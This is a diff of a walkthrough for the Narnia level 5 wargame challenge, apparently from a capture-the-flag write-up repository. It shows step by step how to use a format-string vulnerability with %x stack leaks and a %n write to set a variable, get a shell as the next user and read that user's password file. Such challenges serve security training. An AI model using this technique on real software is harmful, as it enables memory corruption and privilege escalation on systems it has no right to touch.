@@ -72,59 +72,76 @@ i = 1 (0xffb1f50c)
 > Looks like the right track.  Let's see if we can find our way back up the stack to our input.
 >
 >```
-# ./narnia5 AAAA%x%x%x%x%x%x%x
+(gdb) run $(python -c 'print "AAAA"')%x%x%x%x%x%x%x
+Starting program: /root/narnia5 $(python -c 'print "AAAA"')%x%x%x%x%x%x%x
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
 Change i's value from 1 -> 500. No way...let me give you a hint!
-buffer : [AAAAf7650960ffbff5f6f75fe315ffbff5f7414141413536376630363930] (60)
-i = 1 (0xffbff61c)
-# ./narnia5 AAAA%x%x%x%x%x
+buffer : [AAAAf7ed8960ffffd4c6f7e86315ffffd4c7414141416465376630363938] (60)
+i = 1 (0xffffd4ec)
+[Inferior 1 (process 7402) exited normally]
+(gdb) run $(python -c 'print "AAAA"')%x%x%x%x%x
+Starting program: /root/narnia5 $(python -c 'print "AAAA"')%x%x%x%x%x
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
 Change i's value from 1 -> 500. No way...let me give you a hint!
-buffer : [AAAAf767f960ff81c7c6f762d315ff81c7c741414141] (44)
-i = 1 (0xff81c7ec)
+buffer : [AAAAf7ed8960ffffd4c6f7e86315ffffd4c741414141] (44)
+i = 1 (0xffffd4ec)
+[Inferior 1 (process 7399) exited normally]
 >```
 >
-> Looks like we have to read 5 times before we get back to our input.  Now we need to locate where ```i``` resides in memory to attempt to change the value.  Let's run our dissassembler and find a good break point.
->
->```asm
- main:
-080484bd         push       ebp                                                 ; XREF=_start+23
-080484be         mov        ebp, esp
-080484c0         and        esp, 0xfffffff0
-080484c3         sub        esp, 0x60
-080484c6         mov        dword [ss:esp+0x5c], 0x1
-080484ce         mov        eax, dword [ss:ebp+arg_4]
-080484d1         add        eax, 0x4
-080484d4         mov        eax, dword [ds:eax]
-080484d6         mov        dword [ss:esp+0x8], eax                             ; argument "format" for method j_snprintf
-080484da         mov        dword [ss:esp+0x4], 0x40                            ; argument "size" for method j_snprintf
-080484e2         lea        eax, dword [ss:esp+0x1c]
-080484e6         mov        dword [ss:esp], eax                                 ; argument "str" for method j_snprintf
-080484e9         call       j_snprintf
-080484ee         mov        byte [ss:esp+0x5b], 0x0
-080484f3         mov        dword [ss:esp], 0x8048610                           ; "Change i's value from 1 -> 500. ", argument "format" for method j_printf
-080484fa         call       j_printf
-080484ff         mov        eax, dword [ss:esp+0x5c]
-08048503         cmp        eax, 0x1f4
-08048508         jne        0x8048522
->
-0804850a         mov        dword [ss:esp], 0x8048631                           ; argument "s" for method j_puts
-08048511         call       j_puts
-08048516         mov        dword [ss:esp], 0x8048636                           ; "/bin/sh", argument "command" for method j_system
-0804851d         call       j_system
->```
->
-> Let's stop at the comparison between ```i``` and ```500``` at ```0x08048503```.
+> Looks like we have to read 5 times before we get back to our input.  They are already giving us the location of ```i``` as ```0xffffd4ec```, so we should be able to move directly into trying to overwrite the value.  To do this we'll use the ```%n``` format as it ```writes the number of bytes written so far```.  We can specify the address to change by inserting it at the begining of our input and using ```%x``` to get back to it.  Then all we need to do is insert the correct number of bytes and we should be able to overwrite ```i``` with the value ```500```.
 >
 >```
-(gdb) run
-Starting program: /root/narnia5 
->
-Breakpoint 1, 0x08048503 in main ()
-(gdb) print/a $eax
-$2 = 0x1
-(gdb) print/a $esp+0x5c
-$3 = 0xffffd4fc
+(gdb) run $(python -c 'print "\xec\xd4\xff\xff"')%08x%08x%08x%08x%n
+Starting program: /root/narnia5 $(python -c 'print "\xec\xd4\xff\xff"')%08x%08x%08x%08x%n
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [����f7ed8960ffffd4c6f7e86315ffffd4c7] (36)
+i = 36 (0xffffd4ec)
 >```
 >
-> Well it looks like the value of ```i``` is sitting at ```0xffffd4fc```.  Let's see if we can use the string format vulnerability to overwrite it.
+> By switching to ```%n``` we can see that we change the value of ```i``` from 1 to 36 so everything appears to be working as expected.  Let's go straight for 500.
 >
-> TODO
+>```
+[Inferior 1 (process 7340) exited normally]
+(gdb) run $(python -c 'print "\xec\xd4\xff\xff"+"A"*464')%08x%08x%08x%08x%n
+Starting program: /root/narnia5 $(python -c 'print "\xec\xd4\xff\xff"+"A"*464')%08x%08x%08x%08x%n
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
+i = 1 (0xffffd31c)
+[Inferior 1 (process 7344) exited normally]
+>```
+>
+> Padded 464 ```A``` to make a total of 500, but it looks like our address for ```i``` has moved.  Let's update that address and try the same payload.
+>
+>```
+(gdb) run $(python -c 'print "\x1c\xd3\xff\xff"+"A"*464')%08x%08x%08x%08x%n
+Starting program: /root/narnia5 $(python -c 'print "\x1c\xd3\xff\xff"+"A"*464')%08x%08x%08x%08x%n
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
+Change i's value from 1 -> 500. GOOD
+# whoami
+root
+>```
+>
+> That looks better.  We are in gdb on the local box.  Let's go see if we can reproduce this on the server.
+>
+>```
+narnia5@melinda:/narnia$ ./narnia5 $(python -c 'print "\x1c\xd3\xff\xff"+"A"*464')%08x%08x%08x%08x%n
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
+i = 1 (0xffffd50c)
+>```
+>
+> Address for ```i``` changed again.  We know what to do.
+>
+>```
+narnia5@melinda:/narnia$ ./narnia5 $(python -c 'print "\x0c\xd5\xff\xff"+"A"*464')%08x%08x%08x%08x%n
+Change i's value from 1 -> 500. GOOD
+$ whoami
+narnia6
+$ cat /etc/narnia_pass/narnia6
+**********
+$ 
+>```
+>
+> Man that never gets old.  On to narnia6.
